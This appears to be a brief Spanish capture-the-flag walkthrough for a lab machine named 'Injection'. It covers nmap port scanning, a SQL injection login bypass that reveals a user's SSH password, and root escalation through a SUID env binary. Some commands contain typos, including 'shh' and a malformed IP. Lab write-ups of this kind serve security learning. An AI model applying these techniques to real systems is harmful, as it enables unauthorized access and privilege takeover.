### Máquina Injection

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2 

22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9UrfkzVjvriOVFwT9rOHz6XGJrVwKK/A6RMody6c0ovLNeCgaU6kCb+dGPPeXwCaio++IwxYm0SxRGYITrhr4=
|   256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJV4CYnqtqSQxWkpfq7xR8DG/nHJfLXDhtkyMHA5pLhO
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Iniciar Sesi\xC3\xB3n
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Navegamos al 172.17.0.2

nos encontramos con un formulario de login:

![alt text](image.png)

![alt text](image-1.png)

en los 2 inputs escribimos ' or 1=1 -- - y nos arrojo la contraseña de dylan

KJSDFG789FGSDF78

## Intrusion

por shh

shh dylan@172.172.17.0.2 -> KJSDFG789FGSDF78

## Escalar privilegios

find / -perm -4000 2>/dev/null

/usr/bin/env

/usr/bin/env /bin/sh -p

![alt text](image-2.png)

